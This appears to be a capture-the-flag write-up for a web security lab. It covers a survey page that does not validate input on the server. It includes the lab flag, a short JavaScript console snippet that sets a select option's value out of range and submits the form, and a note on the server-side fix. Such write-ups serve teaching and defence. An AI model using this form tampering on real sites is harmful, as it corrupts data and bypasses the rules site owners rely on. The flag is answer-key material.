# Input not validated server-side
The survey page (http://192.168.99.100/?page=survey) allows users to vote on 42 staff on a scale of 1-10.

If you inspect the `<select>` and edit any of the option values to be a number greater than 10 and submit the form by selecting that value, you will be given a flag.

Flag:
03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa

JavaScript code that can be pasted into the console to get the flag:
```javascript
(() => {
  const option = document.querySelector('option');
  const select = option.parentNode;

  option.value = 11; // Any int or float above 11 will probably work
  select.form.submit()
})();
```

# How to fix
Check on the server side that `valeur` (the name of the input) is an integer in the range 1..10 (inclusive).
